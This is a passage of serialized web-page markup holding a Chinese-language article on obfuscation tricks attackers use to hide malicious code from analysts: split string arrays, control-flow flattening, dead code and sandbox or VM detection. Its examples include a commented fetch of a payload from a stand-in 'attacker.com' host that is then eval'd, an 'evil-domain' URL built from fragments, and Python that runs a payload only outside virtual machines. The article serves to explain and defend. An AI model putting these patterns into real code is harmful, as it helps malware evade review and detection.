(概念示例)"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// fetch('https://attacker.com/payload.js')"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"//   .then(response => response.text())"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"//   .then(code => eval(code));"}],"\n"]}]]}]}],["$","p",null,{"children":"这种方式对静态分析工具构成了巨大挑战，因为恶意代码在分析阶段根本不存在于代码文件中。"}],["$","h3",null,{"className":"content-header","id":"3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting","children":[["$","a",null,{"href":"#3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"3. 基于数组的字符串混淆与移位 (Array-Based String Obfuscation and Shifting)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 将字符串存储在数组中，并通过间接引用（如下标计算、函数调用返回下标等）来访问，这使得逆向工程和人工代码审查变得更加复杂。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 敏感字符串被拆分、打乱顺序后存储在数组中，通过复杂的索引逻辑或函数调用来重组和访问，从而掩盖其真实意图，减慢分析速度。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 此技术的核心思想是将完整的字符串打散成多个部分，存储在一个或多个数组中。然后通过索引、循环、函数调用等方式在运行时动态地将这些部分重新组合成原始字符串。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"字符串分割与重组："}]," ",["$","code",null,{"className":"custom-code","children":"\"secret_key\""}]," 可能被存储为 ",["$","code",null,{"className":"custom-code","children":"[\"sec\", \"ret_\", \"key\"]"}],"，然后通过 ",["$","code",null,{"className":"custom-code","children":"arr[0] + arr[1] + arr[2]"}]," 来重组。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"顺序打乱与重排："}]," 数组中的元素顺序可能是乱的，通过另一个数组或逻辑来指定正确的重组顺序。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"数组移位/旋转："}]," 有些混淆器（如 JavaScript Obfuscator Tool 的 ",["$","code",null,{"className":"custom-code","children":"stringArrayRotate"}]," 选项）会初始化一个包含所有字符串片段的数组，并在每次访问前对数组进行“旋转”（将最后一个元素移到最前面，或反之），使得每次实际访问的元素下标都在变化，增加了追踪难度。"]}]]}],["$","$L12",null,{"className":"language-javascript","children":["$","code",null,{"className":"language-javascript code-highlight","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 直接看难以理解:"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," confusingArray ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token string","children":"'https://'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'domain'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'.com'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'evil-'"}],["$","span",null,{"className":"token punctuation","children":","}]," ",["$","span",null,{"className":"token string","children":"'/path'"}],["$","span",null,{"className":"token punctuation","children":"]"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 假设通过某种逻辑计算出正确的索引顺序"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," p1 ",["$","span",null,{"className":"token operator","children":"="}]," confusingArray",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token number","children":"0"}],["$","span",null,{"className":"token punctuation","children":"]"}]," ",["$","span",null,{"className":"token comment","children":"// \"https://\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," p2 ",["$","span",null,{"className":"token operator","children":"="}]," confusingArray",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token number","children":"3"}],["$","span",null,{"className":"token punctuation","children":"]"}]," ",["$","span",null,{"className":"token comment","children":"// \"evil-\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," p3 ",["$","span",null,{"className":"token operator","children":"="}]," confusingArray",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token number","children":"1"}],["$","span",null,{"className":"token punctuation","children":"]"}]," ",["$","span",null,{"className":"token comment","children":"// \"domain\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," p4 ",["$","span",null,{"className":"token operator","children":"="}]," confusingArray",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token number","children":"2"}],["$","span",null,{"className":"token punctuation","children":"]"}]," ",["$","span",null,{"className":"token comment","children":"// \".com\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," p5 ",["$","span",null,{"className":"token operator","children":"="}]," confusingArray",["$","span",null,{"className":"token punctuation","children":"["}],["$","span",null,{"className":"token number","children":"4"}],["$","span",null,{"className":"token punctuation","children":"]"}]," ",["$","span",null,{"className":"token comment","children":"// \"/path\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," finalUrl ",["$","span",null,{"className":"token operator","children":"="}]," p1 ",["$","span",null,{"className":"token operator","children":"+"}]," p2 ",["$","span",null,{"className":"token operator","children":"+"}]," p3 ",["$","span",null,{"className":"token operator","children":"+"}]," p4 ",["$","span",null,{"className":"token operator","children":"+"}]," p5 ",["$","span",null,{"className":"token comment","children":"// \"https://evil-domain.com/path\""}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// fetch(finalUrl);"}],"\n"]}]]}]}],["$","p",null,{"children":"分析人员需要仔细追踪数组元素如何被访问和组合，才能理解最终形成的字符串。"}],["$","h3",null,{"className":"content-header","id":"4-控制流混淆-control-flow-obfuscation","children":[["$","a",null,{"href":"#4-控制流混淆-control-flow-obfuscation","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"4. 控制流混淆 (Control Flow Obfuscation)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 复杂的条件判断、冗余的循环、无意义的跳转等会使代码的执行逻辑变得混乱不堪，导致审查人员在看似无害的代码中忽略隐藏的恶意意图。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 混淆的控制流会分散审查人员的注意力，降低检测效率。分析师可能难以确定代码的真实执行路径。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 控制流混淆旨在打乱程序正常的执行顺序，使其难以通过阅读代码来理解。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"不透明谓词 (Opaque Predicates)："}]," 插入一些条件判断语句，其结果在混淆时是已知的（例如 ",["$","code",null,{"className":"custom-code","children":"if (x*x >= 0)"}]," 总是为真，",["$","code",null,{"className":"custom-code","children":"if (1 === 0)"}]," 总是为假），但对于分析工具或阅读者来说可能不那么直观。恶意代码可以被隐藏在这些看似永不执行或总是执行的分支中。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"控制流平坦化 (Control Flow Flattening)："}]," 将原始代码块（如函数体内的语句序列）分解成许多小的代码片段，然后将这些片段放入一个大的 ",["$","code",null,{"className":"custom-code","children":"switch"}]," 语句或类似的调度结构中。通过一个状态变量来控制 ",["$","code",null,{"className":"custom-code","children":"switch"}]," 语句在不同片段之间的跳转。这使得原始的顺序、分支、循环结构变得模糊不清。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"无效代码插入："}]," 在正常的代码块之间插入大量与程序逻辑无关的“垃圾”指令或调用，干扰分析。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"跳转表 (Jump Tables)："}]," 使用函数指针数组或类似的机制，根据计算结果动态决定下一个要执行的代码块。"]}]]}],["$","$L12",null,{"className":"language-javascript","children":["$","code",null,{"className":"language-javascript code-highlight","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// 简单示例：控制流平坦化 (概念)"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"let"}]," state ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"0"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword control-flow","children":"while"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token boolean","children":"true"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token keyword control-flow","children":"switch"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],"state",["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"case"}]," ",["$","span",null,{"className":"token number","children":"0"}],["$","span",null,{"className":"token operator","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token comment","children":"// console.log(\"Step 1\");"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      state ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"2"}]," ",["$","span",null,{"className":"token comment","children":"// 跳转到 case 2"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token keyword control-flow","children":"break"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"case"}]," ",["$","span",null,{"className":"token number","children":"1"}],["$","span",null,{"className":"token operator","children":":"}]," ",["$","span",null,{"className":"token comment","children":"// 这个 case 可能永远不会被直接调用，或者通过复杂计算才到达"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token comment","children":"// window[\"e\" + \"val\"](\"alert('malicious code')\"); // 恶意代码"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      state ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"3"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token keyword control-flow","children":"break"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"case"}]," ",["$","span",null,{"className":"token number","children":"2"}],["$","span",null,{"className":"token operator","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token comment","children":"// console.log(\"Step 2\");"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token keyword control-flow","children":"if"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token function","children":"someCondition"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["        ",["$","span",null,{"className":"token comment","children":"// someCondition 可能是不透明谓词"}],"\n"]}],["$","span",null,{"className":"code-line","children":["        state ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"1"}]," ",["$","span",null,{"className":"token comment","children":"// 条件满足则跳转到恶意代码"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token punctuation","children":"}"}]," ",["$","span",null,{"className":"token keyword control-flow","children":"else"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["        state ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"3"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token keyword control-flow","children":"break"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"case"}]," ",["$","span",null,{"className":"token number","children":"3"}],["$","span",null,{"className":"token operator","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token comment","children":"// console.log(\"End\");"}],"\n"]}],["$","span",null,{"className":"code-line","children":["      ",["$","span",null,{"className":"token keyword control-flow","children":"return"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}]]}]}],["$","p",null,{"children":"分析这种混淆需要耐心和使用专门的去混淆工具或调试器来追踪真实的执行路径。"}],["$","h3",null,{"className":"content-header","id":"5-无用代码插入-dead-code-insertion","children":[["$","a",null,{"href":"#5-无用代码插入-dead-code-insertion","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"5. 无用代码插入 (Dead Code Insertion)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 无关的代码会分散分析人员的注意力，掩盖恶意负载，并可能使自动化检测工具产生误判或性能下降。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 审查人员可能会花费时间分析这些无意义的代码片段，从而无意中忽略了真正的恶意指令。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 此技术涉及向源代码中添加大量永远不会被执行或执行结果不影响程序主要功能的代码。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"永假条件块："}]," ",["$","code",null,{"className":"custom-code","children":"if (false) { ... }"}]," 或 ",["$","code",null,{"className":"custom-code","children":"if (1 > 2) { ... }"}],"。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"无法访问的代码："}]," 在 ",["$","code",null,{"className":"custom-code","children":"return"}]," 语句之后，或在无限循环（没有 ",["$","code",null,{"className":"custom-code","children":"break"}],"）之后的代码。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"计算无用变量："}]," 声明并计算一些变量，但这些变量后续从未使用过。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"调用无副作用的函数："}]," 调用一些空函数或仅执行一些无关紧要操作的函数。"]}]]}],["$","$L12",null,{"className":"language-java","children":["$","code",null,{"className":"code-highlight language-java","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"// Java 示例：分散注意力的无关逻辑"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"public"}]," ",["$","span",null,{"className":"token keyword","children":"void"}]," ",["$","span",null,{"className":"token function","children":"someMethod"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token keyword","children":"int"}]," a ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"10"}],["$","span",null,{"className":"token punctuation","children":","}]," b ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"20"}],["$","span",null,{"className":"token punctuation","children":","}]," c ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"0"}],["$","span",null,{"className":"token punctuation","children":";"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token keyword","children":"for"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token keyword","children":"int"}]," i ",["$","span",null,{"className":"token operator","children":"="}]," ",["$","span",null,{"className":"token number","children":"0"}],["$","span",null,{"className":"token punctuation","children":";"}]," i ",["$","span",null,{"className":"token operator","children":"<"}]," ",["$","span",null,{"className":"token number","children":"100"}],["$","span",null,{"className":"token punctuation","children":";"}]," i",["$","span",null,{"className":"token operator","children":"++"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    c ",["$","span",null,{"className":"token operator","children":"+="}]," ",["$","span",null,{"className":"token punctuation","children":"("}],"a ",["$","span",null,{"className":"token operator","children":"*"}]," b",["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token operator","children":"/"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],"i ",["$","span",null,{"className":"token operator","children":"+"}]," ",["$","span",null,{"className":"token number","children":"1"}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":";"}]," ",["$","span",null,{"className":"token comment","children":"// 复杂的无用计算"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token keyword","children":"if"}]," ",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token class-name","children":"System"}],["$","span",null,{"className":"token punctuation","children":"."}],["$","span",null,{"className":"token function","children":"currentTimeMillis"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token operator","children":"<"}]," ",["$","span",null,{"className":"token number","children":"0"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token punctuation","children":"{"}]," ",["$","span",null,{"className":"token comment","children":"// 永假条件"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token class-name","children":"System"}],["$","span",null,{"className":"token punctuation","children":"."}],"out",["$","span",null,{"className":"token punctuation","children":"."}],["$","span",null,{"className":"token function","children":"println"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"\"This will never be printed.\""}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":";"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"// some_other_irrelevant_code();"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token comment","children":"// 真正的恶意逻辑可能隐藏在后面"}],"\n"]}],["$","span",null,{"className":"code-line","children":["  ",["$","span",null,{"className":"token comment","children":"// Runtime.getRuntime().exec(\"malicious command\");"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token punctuation","children":"}"}],"\n"]}]]}]}],["$","p",null,{"children":"虽然这些代码不执行，但它们增加了代码的体积和复杂性，干扰了分析过程。"}],["$","h3",null,{"className":"content-header","id":"6-基于环境的混淆检测-environment-based-obfuscationdetection","children":[["$","a",null,{"href":"#6-基于环境的混淆检测-environment-based-obfuscationdetection","aria-hidden":"true","tabIndex":"-1","children":["$","span",null,{"className":"content-header-link","children":["$","svg",null,{"className":"h-5 linkicon w-5","fill":"currentColor","viewBox":"0 0 20 20","xmlns":"http://www.w3.org/2000/svg","children":[["$","path",null,{"d":"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"}],["$","path",null,{"d":"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"}]]}]}]}],"6. 基于环境的混淆/检测 (Environment-Based Obfuscation/Detection)"]}],["$","p",null,{"children":[["$","strong",null,{"children":"攻击者为何青睐此法："}]," 仅在特定环境条件下（如生产服务器、特定操作系统、检测到非调试环境）激活恶意软件，可以避免在受控的安全测试环境（沙箱、分析虚拟机）中被检测到。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"如何帮助攻击者："}]," 恶意代码仅在目标环境中执行，从而成功规避了早期的检测和分析。"]}],["$","p",null,{"children":[["$","strong",null,{"children":"原理详解："}]," 恶意软件在执行前会检查其运行环境。如果环境符合其预设的“安全”或“目标”条件，则执行恶意负载；否则，它可能保持静默或执行一些无害的行为。"]}],["$","ul",null,{"children":[["$","li",null,{"children":[["$","strong",null,{"children":"反沙箱/反虚拟机技术："}],["$","ul",null,{"children":[["$","li",null,{"children":["检测虚拟化软件的特定文件、注册表项、进程（如 ",["$","code",null,{"className":"custom-code","children":"vmtoolsd.exe"}],"）。"]}],["$","li",null,{"children":"检测 CPU 特性或指令执行时间的差异（虚拟机通常比物理机慢）。"}],["$","li",null,{"children":"检测常见的分析工具进程（如 Wireshark, Process Explorer）。"}],["$","li",null,{"children":["检测调试器的存在（如通过 ",["$","code",null,{"className":"custom-code","children":"IsDebuggerPresent()"}]," API）。"]}]]}]]}],["$","li",null,{"children":[["$","strong",null,{"children":"时间延迟执行："}]," 在系统启动或首次运行后等待一段较长的时间（如几小时或几天）再执行恶意行为，以期躲过沙箱的短期监控。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"用户活动检测："}]," 检查鼠标移动、键盘输入、窗口交互等，确认是真实用户环境而非自动化分析环境。"]}],["$","li",null,{"children":[["$","strong",null,{"children":"特定配置检测："}]," 检查特定的域名、IP 地址、用户名、系统语言或是否存在某些特定文件，只在这些条件满足时激活。"]}]]}],["$","$L12",null,{"className":"language-python","children":["$","code",null,{"className":"code-highlight language-python","children":[["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"import"}]," os\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"import"}]," time\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token comment","children":"# 简单的环境检测示例"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"def"}]," ",["$","span",null,{"className":"token function","children":"check_environment"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# 检测是否在虚拟机内 (简化示例，实际检测更复杂)"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"if"}]," os",["$","span",null,{"className":"token punctuation","children":"."}],"path",["$","span",null,{"className":"token punctuation","children":"."}],"exists",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"\"/.dockerenv\""}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token keyword","children":"or"}]," ",["$","span",null,{"className":"token string","children":"\"VMware\""}]," ",["$","span",null,{"className":"token keyword","children":"in"}]," os",["$","span",null,{"className":"token punctuation","children":"."}],"popen",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"\"systeminfo\""}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":"."}],"read",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["        ",["$","span",null,{"className":"token keyword","children":"return"}]," ",["$","span",null,{"className":"token boolean","children":"False"}]," ",["$","span",null,{"className":"token comment","children":"# 在虚拟机或 Docker 中，不激活"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# 检测是否有调试器 (概念)"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# if is_debugger_present():"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"#    return False"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# 检测特定用户名"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# if os.getlogin() == \"sandbox_user\":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"#    return False"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"return"}]," ",["$","span",null,{"className":"token boolean","children":"True"}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"def"}]," ",["$","span",null,{"className":"token function","children":"malicious_payload"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"print"}],["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"\"Executing malicious payload...\""}],["$","span",null,{"className":"token punctuation","children":")"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# ... 恶意代码 ..."}],"\n"]}],["$","span",null,{"className":"code-line","children":"\n"}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"if"}]," os",["$","span",null,{"className":"token punctuation","children":"."}],"getenv",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token string","children":"'APP_ENV'"}],["$","span",null,{"className":"token punctuation","children":")"}]," ",["$","span",null,{"className":"token operator","children":"=="}]," ",["$","span",null,{"className":"token string","children":"'production'"}]," ",["$","span",null,{"className":"token keyword","children":"and"}]," check_environment",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],["$","span",null,{"className":"token punctuation","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# 仅在生产环境且通过环境检测后执行"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# time.sleep(3600) # 延迟一小时执行"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token comment","children":"# exec(\"some_obfuscated_malicious_code_string\")"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    malicious_payload",["$","span",null,{"className":"token punctuation","children":"("}],["$","span",null,{"className":"token punctuation","children":")"}],"\n"]}],["$","span",null,{"className":"code-line","children":[["$","span",null,{"className":"token keyword","children":"else"}],["$","span",null,{"className":"token punctuation","children":":"}],"\n"]}],["$","span",null,{"className":"code-line","children":["    ",["$","span",null,{"className":"token keyword","children":"print"}],["$","span",null,{"className":"token 